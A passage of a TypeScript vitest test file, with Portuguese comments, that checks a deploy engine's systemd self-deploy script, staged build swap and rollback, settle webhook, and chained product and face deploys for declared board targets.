import { describe, expect, it, vi } from "vitest";
import {
  authorizeDeployCommand,
  buildSelfDeployScript,
  deployBoard,
  parseDeclaredArgv,
  resolveDeployKind,
  resolveDeployLaunchers,
  resolveDeployRecipes,
  type DeploySettleFn,
} from "./deploy";
import {
  ProductDeployRegistry,
  composedFaceManifestStatus,
  composedFaceTarget,
  type DeployLauncher,
  type DeployLaunchSpec,
} from "./product-deploy";

/**
 * Os alvos deployáveis que ESTES casos declaram, injetados em cada `deployBoard`.
 *
 * Antes eles não existiam: o roteamento consultava uma lista literal no fonte do motor, então o teste
 * media a mesma constante que o código — e passava por medir o roteamento. Com a lista virando declaração
 * do alvo, ler a declaração REAL aqui amarraria a suíte ao settings.yaml da máquina: verde neste monorepo,
 * vermelho num checkout que não declara nada, e em nenhum dos dois medindo o que o título promete.
 */
const ALVOS_TESTE = ["nestify", "comet", "quartz"] as const;
import { settleDeploySuccess } from "./deploy-reconcile";
import type { DeployAgentVerdict } from "./deploy-agent-spawn";
import { parseBoardConfig } from "@/lib/storymap/contracts";
import type { BoardConfig, Card } from "@/lib/storymap/types";
import type { ExecFn } from "./worktree";

// Records the commands deployBoard issues so the (self-restart-paradox) command construction is testable
// WITHOUT ever touching systemd. `fail` models systemd-run refusing to start (a deploy already in flight).
function recordingExec(opts: { fail?: boolean } = {}) {
  const calls: string[] = [];
  const exec: ExecFn = async (cmd) => {
    calls.push(cmd);
    if (opts.fail) throw Object.assign(new Error("Unit storymap-deploy.service already exists"), { code: 1 });
    return { stdout: "", stderr: "" };
  };
  return { exec, calls };
}

describe("deployBoard — Fase 4c board-aware deploy", () => {
  it("storymap board → DETACHED rebuild+restart via systemd-run (never in-process)", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/storymap-ui", toolPackageDir: "/repo/packages/storymap-ui" });

    expect(res).toEqual({ fired: true, tool: "systemd-restart" });
    const cmd = calls[0];
    // detached unit + idempotent fixed name + build BEFORE the service is touched (broken build never
    // restarts onto it). O build é STAGED: nada é escrito nos artefatos que o processo vivo serve.
    expect(cmd).toContain("systemd-run --collect --unit storymap-deploy");
    expect(cmd).toContain("reset-failed storymap-deploy");
    expect(cmd).toContain("bun run build:staged");
    expect(cmd).toContain("systemctl stop storymap");
    expect(cmd).toContain("systemctl start storymap");
    // the build runs to the LEFT of the swap in the chain (order is load-bearing)
    expect(cmd.indexOf("bun run build:staged")).toBeLessThan(cmd.indexOf("systemctl stop storymap"));
  });

  // ── C1/C3 do plano da inversão: a régua do self-deploy é "este board É a ferramenta que está rodando" ──
  // Enquanto a ferramenta morou DENTRO do repositório que ela opera, `packages/storymap-ui` do alvo E a
  // ferramenta no ar eram o mesmo diretório, e nenhum caso conseguia distinguir os dois. Quando divergem,
  // a régua antiga (comparar o NOME do caminho) mandava reconstruir a cópia MORTA do alvo e reiniciar o
  // serviço que roda da outra árvore — com a prova tirada do repositório errado.
  // As DUAS raízes têm donos diferentes DENTRO do mesmo script, e este é o único lugar onde isso é
  // observável: depois da régua do despacho elas são iguais por construção. O `cd` do build+restart é da
  // FERRAMENTA (é ela que está no ar); os passos declarados de publicação de superfície rodam do ALVO (é
  // dele o artefato publicado). Trocar um pelo outro foi exatamente o defeito C1.
  it("separa as duas raízes: o build+restart roda da FERRAMENTA, a publicação de superfície roda do ALVO", () => {
    const s = buildSelfDeployScript({
      repoRoot: "/alvo",
      toolPackageDir: "/ferramenta/packages/storymap-ui",
      webhookBase: "http://x",
      tokenEnvName: "T",
      logPath: "/l",
      postBuildCommands: ["just sync-web-terminal"],
    });
    expect(s.startsWith('cd "/ferramenta/packages/storymap-ui" && ')).toBe(true);
    expect(s).not.toContain('cd "/alvo/packages/storymap-ui"'); // a concatenação antiga
    // e o suplemento de superfície continua ancorado no ALVO
    expect(s).toContain("/alvo");
  });

  it("RECUSA o self-deploy quando a árvore declarada não é a que está no ar — e não executa NADA", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({
      exec,
      repoRoot: "/alvo",
      boardPackage: "packages/storymap-ui", // resolve para /alvo/packages/storymap-ui
      toolPackageDir: "/ferramenta/packages/storymap-ui", // …mas o que está no ar é outro
      board: "storymap",
      cardId: "story-x",
    });

    expect(res.fired).toBe(false);
    // A propriedade que importa não é o veredito — é que NADA aconteceu. Um build jogado fora seria
    // desperdício; o `systemctl stop/start` seria produção reiniciada à toa.
    expect(calls).toEqual([]);
    // e a recusa NOMEIA as duas árvores: um "recusado" mudo obriga o operador a adivinhar qual é qual.
    expect(res.reason).toContain("/alvo/packages/storymap-ui");
    expect(res.reason).toContain("/ferramenta/packages/storymap-ui");
    // NÃO é `inFlight`: não há deploy em curso para re-despachar. `fired:false` sem `inFlight` é o
    // caminho que o efeito já trata como fail-closed (arma o watchdog, card de código fica PARADO).
    expect(res.inFlight).toBeUndefined();
  });

  // NÃO-VACUIDADE: sem a divergência, a mesma chamada dispara. Sem este par, a asserção acima passaria
  // igual se a régua recusasse SEMPRE — e um self-deploy que nunca dispara é outro defeito, não o conserto.
  it("…e dispara normalmente quando as duas árvores são a MESMA", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({
      exec,
      repoRoot: "/alvo",
      boardPackage: "packages/storymap-ui",
      toolPackageDir: "/alvo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
    });
    expect(res.fired).toBe(true);
    expect(calls.length).toBe(1);
    // e o `cd` do script destacado aponta para a árvore DA FERRAMENTA, não para uma concatenação da do alvo
    expect(calls[0]).toContain('cd "/alvo/packages/storymap-ui"');
  });

  it("storymap self-deploy WITH card context ARMS the settle webhook + imports the token via --setenv (never inline)", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/storymap-ui", toolPackageDir: "/repo/packages/storymap-ui", board: "storymap", cardId: "story-x" });

    expect(res.fired).toBe(true);
    expect(res.settleArmed).toBe(true); // the effect will stamp deployFiredAt so the watchdog can catch a dead restart
    const cmd = calls[0];
    expect(cmd).toContain("--setenv=STORYMAP_MCP_TOKEN"); // token IMPORTED from the service env, not interpolated
    expect(cmd).toContain("deploy-webhook?secret=$STORYMAP_MCP_TOKEN"); // referenced by name — value never inline
    expect(cmd).toContain("--retry-connrefused"); // MANDATORY: the restart window is connection-refused
    // POSIX single-quoted bash -c arg → the outer shell must NOT expand the script's own $PF/$STATUS/$(...)
    expect(cmd).toContain("bash -c '");
  });

  it("storymap manual deploy (no card) → no settle curl, no --setenv, settleArmed falsy (fail-open)", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/storymap-ui", toolPackageDir: "/repo/packages/storymap-ui" });
    expect(res.settleArmed).toBeFalsy();
    expect(calls[0]).not.toContain("--setenv");
    expect(calls[0]).not.toContain("curl");
  });

  it("a second deploy while one is in flight is a non-fatal no-op (idempotent on the unit name)", async () => {
    const { exec } = recordingExec({ fail: true });
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/storymap-ui", toolPackageDir: "/repo/packages/storymap-ui" });
    expect(res.fired).toBe(false);
    expect(res.tool).toBe("systemd-restart");
    expect(res.inFlight).toBe(true); // 1.5 — flags the collision so the caller parks the card for re-dispatch
    expect(res.reason).toMatch(/em curso|já|already/i);
  });

  it("a PRODUCT board fires `just orch-deploy <pkg>` via the shared registry (agnostic, derived from package)", async () => {
    const { exec, calls } = recordingExec();
    const started: string[] = [];
    const fakeLauncher: DeployLauncher = (pkg) => {
      started.push(pkg);
      return { pid: 4242, whenDone: () => {} };
    };
    const productDeploy = new ProductDeployRegistry(fakeLauncher);
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/nestify", deployTargets: ALVOS_TESTE, productDeploy });

    expect(res.fired).toBe(true);
    expect(res.tool).toBe("orch-deploy");
    expect(res.pkg).toBe("nestify"); // derived from the package basename — no hardcoded app name
    expect(started).toEqual(["nestify"]); // orch-deploy fired for the right package
    expect(calls).toEqual([]); // NO systemd-run — a product deploy is a tracked child, not a self-restart
  });

  it("a PRODUCT board already deploying is an idempotent no-op (registry isRunning)", async () => {
    const { exec } = recordingExec();
    const productDeploy = new ProductDeployRegistry(() => ({ pid: 1, whenDone: () => {} }));
    productDeploy.start("nestify"); // a deploy is already in flight
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/nestify", deployTargets: ALVOS_TESTE, productDeploy });
    expect(res.fired).toBe(false);
    expect(res.tool).toBe("orch-deploy");
    expect(res.reason).toMatch(/já em andamento/);
  });

  it("a board whose package is not a declared deploy target is a no-op note (never silently fired)", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: "packages/some-internal-lib", deployTargets: ALVOS_TESTE });
    expect(res.fired).toBe(false);
    // A recusa tem de dizer ONDE SE CONSERTA. Ela citava `DEPLOY_PKGS` — o nome de uma constante interna
    // do motor —, e num produto usado por outros repositórios isso manda o leitor procurar num arquivo que
    // ele não tem. As duas cobranças são: o lugar da configuração, e o caminho alternativo (o descritor).
    expect(res.reason).toMatch(/deploy\.targets/);
    expect(res.reason).toMatch(/deploy:/);
    expect(res.reason, "a recusa não pode citar um símbolo interno que o operador não consegue abrir").not.toMatch(
      /DEPLOY_PKGS/,
    );
    expect(calls).toEqual([]);
  });

  it("a board with no package is a no-op", async () => {
    const { exec, calls } = recordingExec();
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined });
    expect(res.fired).toBe(false);
    expect(res.reason).toMatch(/sem .*package/i);
    expect(calls).toEqual([]);
  });
});

// WS1.1 — the self-deploy script is a PURE builder so the self-restart-paradox + settle-webhook wiring is
// unit-testable without ever touching systemd/curl. Assert the load-bearing SEMANTICS, not a literal string.
describe("buildSelfDeployScript — self-deploy settle loop (WS1.1)", () => {
  const withCard = () =>
    buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/repo/storymap/.runner/self-deploy.log",
    });

  it("builds BEFORE it touches the service (a broken build never restarts onto bad code)", () => {
    const s = withCard();
    expect(s).toContain("bun run build:staged");
    expect(s).toContain("systemctl stop storymap");
    expect(s.indexOf("bun run build:staged")).toBeLessThan(s.indexOf("systemctl stop storymap"));
  });

  /**
   * A JANELA DE 500. `next build` reescrevia o `.next` que o servidor vivo lê por caminho: durante ~1 min
   * por publicação o serviço respondia 500 (`clientModules` undefined, medido 2026-07-28 18:49:51) —
   * parecendo no ar sem estar. Hoje o build inteiro vai para artefatos de STAGING e a troca é um `mv` com
   * o serviço já parado: sobra a indisponibilidade do restart, que é honesta (conexão recusada).
   */
  it("NUNCA builda por cima dos artefatos que o processo vivo serve", () => {
    const s = withCard();
    expect(s).toContain("build:staged"); // → .next-staging + dist/ah-server.staged.mjs
    expect(s).not.toContain("bun run build &&"); // o build in-place não pode voltar
    // e a troca acontece com o serviço PARADO, nunca sob tráfego
    expect(s.indexOf("systemctl stop storymap")).toBeLessThan(s.indexOf("mv .next-staging .next"));
    expect(s.indexOf("mv .next-staging .next")).toBeLessThan(s.indexOf("systemctl start storymap"));
  });

  it("o serviço SEMPRE volta — um `mv` que falhe não pode deixá-lo no chão", () => {
    const s = withCard();
    // `systemctl start` fora de qualquer `&&`: precedido por `;`, nunca por `&&`.
    expect(s).toMatch(/;\s*systemctl start storymap/);
    expect(s).not.toMatch(/&&\s*systemctl start storymap/);
    // …e o veredito da troca é reavaliado DEPOIS do start, para o STATUS não mentir.
    expect(s.lastIndexOf('[ "$SWAP" = ok ]')).toBeGreaterThan(s.indexOf("systemctl start storymap"));
  });

  it("faz ROLLBACK para o build anterior se o staging não entrar no lugar", () => {
    const s = withCard();
    expect(s).toContain("mv .next .next-prev"); // guarda o anterior antes de trocar
    expect(s).toContain("mv .next-prev .next"); // e o devolve quando a troca falha
  });

  /**
   * Medido neste repo: staging FRIO = 136s, QUENTE = 44s (3,1x). Sem reciclar o diretório anterior como
   * staging do próximo deploy, a correção da janela de 500 custaria um build 3x mais lento para sempre.
   */
  it("recicla o build anterior como staging do próximo deploy (o cache sobrevive)", () => {
    const s = withCard();
    expect(s).toContain("mv .next-prev .next-staging");
    expect(s.indexOf("systemctl start storymap")).toBeLessThan(s.indexOf("mv .next-prev .next-staging"));
  });

  it("chains the versioned settle webhook with BOTH ok/failed branches + --retry-connrefused", () => {
    const s = withCard();
    expect(s).toContain("--retry-connrefused"); // the restart window IS connection-refused
    expect(s).toContain("STATUS=ok");
    expect(s).toContain("STATUS=failed");
    expect(s).toContain('"v":1'); // versioned payload (drift-guard on the route)
    expect(s).toContain('"board":"storymap"');
    expect(s).toContain('"cardId":"story-x"');
    expect(s).toContain('"phase":"self-deploy"');
    expect(s).toContain("deploy-webhook?secret=$STORYMAP_MCP_TOKEN"); // token by NAME, not value
  });

  it("attaches a base64 logTail ONLY on the failed branch (forensics without JSON-escaping hell)", () => {
    const s = withCard();
    expect(s).toContain("logTailB64");
    expect(s).toContain("base64");
    expect(s).toContain("tail -n 50");
    // the tail is only built in the else/failed branch — the ok payload has no logTailB64
    expect(s.indexOf("logTailB64")).toBeGreaterThan(s.indexOf("STATUS=failed"));
  });

  it("no card context → NO settle curl (fail-open: a manual deploy needn't settle a card)", () => {
    const manual = buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/l",
    });
    expect(manual).toContain("bun run build:staged");
    expect(manual).toContain("systemctl start storymap");
    expect(manual).not.toContain("curl");
    expect(manual).not.toContain("secret=");
  });
});

// story-zr1cmf — the post-build PUBLISH supplement (declared deploy.surfaces[].deployCmd) spliced INTO the
// detached self-deploy script. Assert the load-bearing SEMANTICS: STATUS-gated, non-fatal, time-boxed, from
// repoRoot via a login shell, on BOTH the card and card-free branches — and byte-identical legacy when absent.
describe("buildSelfDeployScript — post-build surface publish (story-zr1cmf)", () => {
  const CMD = "just sync-web-terminal";
  const withCardAndPublish = () =>
    buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/repo/storymap/.runner/self-deploy.log",
      postBuildCommands: [CMD],
    });

  it("runs the declared command AFTER restart, GATED on STATUS=ok, time-boxed, via a login shell, from repoRoot", () => {
    const s = withCardAndPublish();
    expect(s).toContain(CMD);
    expect(s).toContain("bash -lc"); // login shell → operator PATH (just/bun resolve like /root/update.sh)
    expect(s).toContain("timeout "); // bounded so a hung sync can't starve the settle
    expect(s).toContain('if [ "$STATUS" = ok ]; then'); // never publishes onto a broken build/restart
    expect(s).toContain('cd "/repo"'); // from the repo root, not the storymap-ui package dir
    expect(s.indexOf(CMD)).toBeGreaterThan(s.indexOf("systemctl restart storymap"));
  });

  it("is NON-FATAL: a publish failure is logged, never fails the unit nor flips STATUS", () => {
    const s = withCardAndPublish();
    expect(s).toContain("|| echo"); // failure → a log line, not a non-zero exit
    expect(s).toContain("[postBuild] falhou");
  });

  it("publishes BEFORE the settle so a slow/failed sync cannot starve nor falsify the proof", () => {
    const s = withCardAndPublish();
    expect(s.indexOf(CMD)).toBeLessThan(s.indexOf("curl")); // settle (proof = build+restart) runs last
  });

  it("card-free (publish-queue) branch ALSO gets the STATUS-gated supplement — never a bare &&", () => {
    const s = buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/l",
      postBuildCommands: [CMD],
    });
    expect(s).toContain(CMD);
    expect(s).toContain('if [ "$STATUS" = ok ]; then'); // gated, not chained with a fatal &&
    expect(s).toContain("STATUS=ok");
    expect(s).not.toContain("curl"); // still no settle on the card-free path
  });

  it("NO declared commands → byte-identical legacy script (both branches)", () => {
    const card = buildSelfDeployScript({
      repoRoot: "/repo",
      toolPackageDir: "/repo/packages/storymap-ui",
      board: "storymap",
      cardId: "story-x",
      webhookBase: "http://127.0.0.1:3008",
      tokenEnvName: "STORYMAP_MCP_TOKEN",
      logPath: "/repo/storymap/.runner/self-deploy.log",
    });
    expect(card).not.toContain("bash -lc");
    expect(card).not.toContain("timeout ");
    expect(card).not.toContain("[postBuild]");
    // O invariante é "NADA é enxertado", não um literal do script inteiro: a asserção era byte-a-byte e
    // por isso quebrava a cada mudança legítima do próprio chain (a troca sem janela de 500, aqui).
    const manual = buildSelfDeployScript({ repoRoot: "/repo", toolPackageDir: "/repo/packages/storymap-ui", webhookBase: "http://x", tokenEnvName: "T", logPath: "/l" });
    expect(manual).not.toContain("bash -lc");
    expect(manual).not.toContain("timeout ");
    expect(manual).not.toContain("[postBuild]");
    expect(manual).not.toContain('if [ "$STATUS" = ok ]'); // o gate do suplemento não existe sem suplemento
    expect(manual.startsWith('cd "/repo/packages/storymap-ui" && ')).toBe(true);
    expect(manual.trimEnd().endsWith('[ "$SWAP" = ok ]')).toBe(true); // termina no veredito da troca, sem cauda
  });
});

// A launcher that records every launched target and lets a test SETTLE a specific one (per-target whenDone),
// so the "fire the face only after the backend deploy closes" chain is testable without a real child process.
function keyedLauncher() {
  const started: string[] = [];
  const dones = new Map<string, (code: number | null) => void>();
  const launcher: DeployLauncher = (target) => {
    started.push(target);
    return { pid: 777, whenDone: (cb) => dones.set(target, cb) };
  };
  return { launcher, started, finish: (target: string, code: number | null) => dones.get(target)?.(code) };
}

// story-efwo30 — a product board's `orch-deploy` ships its backend but NOT the cidade.ai merged face (no
// hosting unit in any manifest). When the RELEASE promoted a diff that touched the face, deployBoard must
// ALSO fire the DECLARED face recipe — but only AFTER the backend deploy SETTLES OK (backend-before-face,
// like `just deploy-cidade`), and NEVER if the backend failed. It rides the SAME registry (tracked/idempotent).
describe("deployBoard — cidade.ai face chaining (story-efwo30)", () => {
  // O encadeamento da face depende de `scripts/deploy/cidade-face.json`, que é config do repositório
  // do DONO e não viaja (declarado em SO_DO_UMBRELLA). `loadComposedFaceManifest()` resolve por
  // `findRepoRoot()` — não pelo `repoRoot` do parâmetro —, então no umbrella o manifesto existe e o
  // motor encadeia; no artefato ele degrada para `absent` DE PROPÓSITO.
  //
  // Os dois casos abaixo medem o mundo COM manifesto. O terceiro mede o mundo SEM, e é ele que roda
  // no artefato. Os dois gates são sobre uma condição MEDIDA e são complementares: em cada árvore
  // exatamente um lado executa asserção, e nenhum dos dois é vazio. Um `if (!existe) return` solto
  // deixaria o artefato sem cobertura NENHUMA desta rota — que é o que havia antes.
  // O GATE É MEDIDO NO MOTOR, e não mais por "existe este arquivo do umbrella?" (era
  // `soDoUmbrella("scripts/deploy/<algo>.json")`, um literal que só fazia sentido nesta árvore). Agora a
  // face é DECLARADA pelo alvo, e o motor já distingue três estados — `loaded` / `absent` / `unreadable`.
  // Perguntar por `loaded` é a condição exata que os casos precisam, em qualquer árvore, e ela cobre de
  // graça um terceiro mundo que o gate antigo não via: declarada e ILEGÍVEL.
  const TEM_MANIFESTO = composedFaceManifestStatus() === "loaded";
  const ALVO_DA_FACE = composedFaceTarget();

  // `skipIf` NO LUGAR DO `return` ANTECIPADO (2026-08-12). Um `if (cond) return;` no corpo faz o
  // caso sair SEM asserção nenhuma — e no relatório "passou" e "não mediu nada" viram a mesma linha
  // verde. Estes quatro casos são COMPLEMENTARES por desenho (cada árvore executa um lado), então o
  // que se quer dizer é "pulado AQUI", e o vitest sabe dizer isso. Com `expect.requireAssertions`
  // ligado o retorno antecipado passou a REPROVAR, que é o instrumento funcionando: ele não sabe
  // distinguir omissão deliberada de omissão esquecida, e a diferença tem de estar escrita.
  it.skipIf(!TEM_MANIFESTO)("ARMS a chained face publish and fires it only AFTER the backend deploy settles OK", async () => {
    const { exec } = recordingExec();
    const f = keyedLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      board: "nest",
      cardId: "story-1",
      expectWork: true,
      changedFiles: ["packages/nestify/web/src/app/page.tsx"], // a face path
      productDeploy: reg,
    });

    expect(res.fired).toBe(true);
    expect(res.pkg).toBe("nestify");
    expect(res.chainedComposedFace).toBe(true); // a face publish is armed
    expect(f.started).toEqual(["nestify"]); // backend fired; face NOT yet (backend still running)

    f.finish("nestify", 0); // backend deploy closes exit-0
    expect(f.started).toEqual(["nestify", ALVO_DA_FACE]); // face published only now, after the backend settled OK
    // the face job carries the card ctx, so its OWN failure reverts the card (truthful "No ar") via the
    // existing G3 onDone subscriber — a face publish is part of the ship, not a silent side-quest.
    expect(reg.get(ALVO_DA_FACE!)).toMatchObject({ board: "nest", cardId: "story-1" });
  });

  it.skipIf(TEM_MANIFESTO)("SEM o manifesto (o repo extraído), degrada com SEGURANÇA: o backend dispara e a face não é armada", async () => {
    // Este é o caso que roda NO ARTEFATO — e a propriedade que ele guarda é a que mais importa lá:
    // a degradação não pode BLOQUEAR o deploy. Um motor que, sem manifesto, deixasse de disparar o
    // backend transformaria "não há superfície composta declarada" em "nada é publicado", e o
    // adotante veria um pipeline mudo sem entender por quê.
    //
    // No umbrella este caso não executa (lá o manifesto existe e os dois de cima é que medem). O par
    // que torna isso honesto é a complementaridade: `TEM_MANIFESTO` é medido, não presumido, e cada
    // árvore executa exatamente um dos dois lados.

    const { exec } = recordingExec();
    const f = keyedLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      board: "nest",
      cardId: "story-1",
      expectWork: true,
      changedFiles: ["packages/nestify/web/src/app/page.tsx"], // o MESMO diff de face dos casos acima
      productDeploy: reg,
    });

    // o deploy do backend acontece: a ausência de manifesto não pode custar a publicação
    expect(res.fired).toBe(true);
    expect(res.pkg).toBe("nestify");
    expect(f.started).toEqual(["nestify"]);
    // e a face NÃO é armada — nem antes, nem depois de o backend fechar
    expect(res.chainedComposedFace).toBeFalsy();
    f.finish("nestify", 0);
    expect(f.started).toEqual(["nestify"]);
    expect(ALVO_DA_FACE === null || reg.get(ALVO_DA_FACE) === undefined).toBe(true);
  });

  it("does NOT arm the face when the promoted diff has NO face path (backend-only change)", async () => {
    const { exec } = recordingExec();
    const f = keyedLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      board: "nest",
      cardId: "story-2",
      changedFiles: ["packages/nestify/api/src/graph/node.ts"], // backend only
      productDeploy: reg,
    });

    expect(res.chainedComposedFace).toBeFalsy();
    f.finish("nestify", 0);
    expect(f.started).toEqual(["nestify"]); // face never fired
  });

  it.skipIf(!TEM_MANIFESTO)("does NOT publish the face when the backend deploy FAILS (a broken backend never gets a new face)", async () => {
    const { exec } = recordingExec();
    const f = keyedLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      board: "nest",
      cardId: "story-3",
      changedFiles: ["packages/quartz-shared/src/ui/Button.tsx"], // face path (shared SDK)
      productDeploy: reg,
    });
    expect(res.chainedComposedFace).toBe(true);

    f.finish("nestify", 1); // backend deploy FAILS
    expect(f.started).toEqual(["nestify"]); // face suppressed
  });

  it("does not double-fire the face when one is already in flight (registry idempotency)", async () => {
    const { exec } = recordingExec();
    const f = keyedLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    if (ALVO_DA_FACE) reg.start(ALVO_DA_FACE); // a face deploy is already running (e.g. another board just fired it)
    await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      board: "nest",
      cardId: "story-4",
      changedFiles: ["packages/nestify/web/src/app/page.tsx"],
      productDeploy: reg,
    });
    f.finish("nestify", 0);
    // A propriedade é "NÃO disparou uma SEGUNDA vez". A primeira é a que o próprio caso arma acima
    // (`reg.start(ALVO_DA_FACE)`), então a conta é 1 sempre que há alvo declarado — com ou sem manifesto.
    // Escrevi `ALVO_DA_FACE && TEM_MANIFESTO ? 1 : 0` primeiro e o artefato extraído reprovou: lá a face
    // é DECLARADA (o settings viaja) mas o manifesto NÃO, então os dois divergem — e é justamente esse o
    // par de estados que a declaração passou a distinguir.
    expect(f.started.filter((t) => t === ALVO_DA_FACE)).toHaveLength(ALVO_DA_FACE ? 1 : 0); // not fired a second time
  });

  it("does not arm the face for a board already deploying (no fired backend → nothing to chain)", async () => {
    const { exec } = recordingExec();
    const f = keyedLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    reg.start("nestify"); // nestify already in flight
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify",

      deployTargets: ALVOS_TESTE,      board: "nest",
      cardId: "story-5",
      changedFiles: ["packages/nestify/web/src/app/page.tsx"],
      productDeploy: reg,
    });
    expect(res.fired).toBe(false);
    expect(res.chainedComposedFace).toBeFalsy();
  });
});

// ── Deploy agnóstico (docs/plans/deploy-agnostic/) ───────────────────────────────────────────────────────

// D-AG1 — the pure kind resolution: absent block / kind:auto ⇒ legacy routing; explicit kind wins; with
// kind omitted the mechanism is inferred from which field the block carries (the OSS target format).
describe("resolveDeployKind — descritor ausente/auto = roteamento legado (D-AG1)", () => {
  it("bloco ausente ⇒ auto (legado byte-a-byte)", () => {
    expect(resolveDeployKind(undefined)).toBe("auto");
  });
  it("kind explícito vence", () => {
    expect(resolveDeployKind({ kind: "command", command: "x", description: "y" })).toBe("command");
    expect(resolveDeployKind({ kind: "agent", description: "y", command: "x" })).toBe("agent");
    expect(resolveDeployKind({ kind: "auto", command: "x" })).toBe("auto");
  });
  it("sem kind: command presente ⇒ command; só description ⇒ agent; nenhum ⇒ auto", () => {
    expect(resolveDeployKind({ command: "vercel deploy --prod" })).toBe("command");
    expect(resolveDeployKind({ description: "publique via flyctl" })).toBe("agent");
    expect(resolveDeployKind({ healthUrl: "https://x/api/health" })).toBe("auto");
    expect(resolveDeployKind({ command: "   " })).toBe("auto"); // whitespace não é um comando
  });
});

// A launcher that records the SPEC each start received and lets the test settle a target with a verdict —
// the DI seam D-AG2/D-AG3 add to the registry (job key = board id, launch spec = the declared deploy).
function specLauncher() {
  const started: { target: string; spec?: DeployLaunchSpec }[] = [];
  const dones = new Map<string, (code: number | null) => void>();
  let verdict: DeployAgentVerdict | null = null;
  const launcher: DeployLauncher = (target, _logFile, spec) => {
    started.push({ target, spec });
    return { pid: 55, whenDone: (cb) => dones.set(target, cb), verdict: () => verdict };
  };
  return {
    launcher,
    started,
    setVerdict: (v: DeployAgentVerdict) => (verdict = v),
    finish: (target: string, code: number | null) => dones.get(target)?.(code),
  };
}

// D-AG2 — kind:command: the board's DECLARED shell rides the SAME registry (job key = the BOARD id), so
// tracking/onDone/revert/settle are all the existing cycle — no parallel mechanism.
describe("deployBoard — descritor kind:command (D-AG2)", () => {
  const boardDeploy = { kind: "command" as const, command: "vercel deploy --prod" };

  it("dispara o comando declarado pelo registry com a chave do job = id do board (e NUNCA o roteamento por package)", async () => {
    const { exec, calls } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
      boardPackage: "packages/nestify", // um package deployável — o descritor declarado tem de VENCER
      deployTargets: ALVOS_TESTE,
      board: "nest",
      cardId: "s1",
      expectWork: true,
      boardDeploy,
      productDeploy: reg,
    });

    expect(res).toMatchObject({ fired: true, tool: "board-command", targets: ["nest"] });
    // story-dlsxfj: o que segue é a argv AUTORIZADA citada palavra por palavra (mesma execução, sem deixar
    // o `bash -lc` do outro lado expandir `$VAR`/`$(…)` de dentro das aspas do dado declarado).
    expect(f.started).toEqual([{ target: "nest", spec: { kind: "shell", command: `'vercel' 'deploy' '--prod'` } }]);
    expect(reg.get("nest")).toMatchObject({ board: "nest", cardId: "s1", expectWork: true }); // ctx threaded → onDone age no card
    expect(calls).toEqual([]); // nem systemd-run nem nada por exec — o launcher é o único efeito
  });

  it("já em andamento ⇒ no-op idempotente (mesma régua isRunning do orch-deploy)", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    reg.start("nest", undefined, { kind: "shell", command: "x" });
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "nest", cardId: "s2", boardDeploy, productDeploy: reg });
    expect(res.fired).toBe(false);
    expect(res.tool).toBe("board-command");
    expect(res.reason).toMatch(/já em andamento/);
    expect(f.started).toHaveLength(1); // só o pré-existente
  });

  it("kind:command sem `command` ⇒ nada dispara, motivo legível (config inválida, fail-closed)", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({ exec, repoRoot: "/repo", boardPackage: undefined, board: "nest", boardDeploy: { kind: "command" }, productDeploy: reg });
    expect(res.fired).toBe(false);
    expect(res.reason).toMatch(/sem `command`/);
    expect(f.started).toEqual([]);
  });

  it("kind:auto declarado ⇒ roteamento legado (orch-deploy por package), byte-a-byte", async () => {
    const { exec } = recordingExec();
    const f = specLauncher();
    const reg = new ProductDeployRegistry(f.launcher);
    const res = await deployBoard({
      exec,
      repoRoot: "/repo",
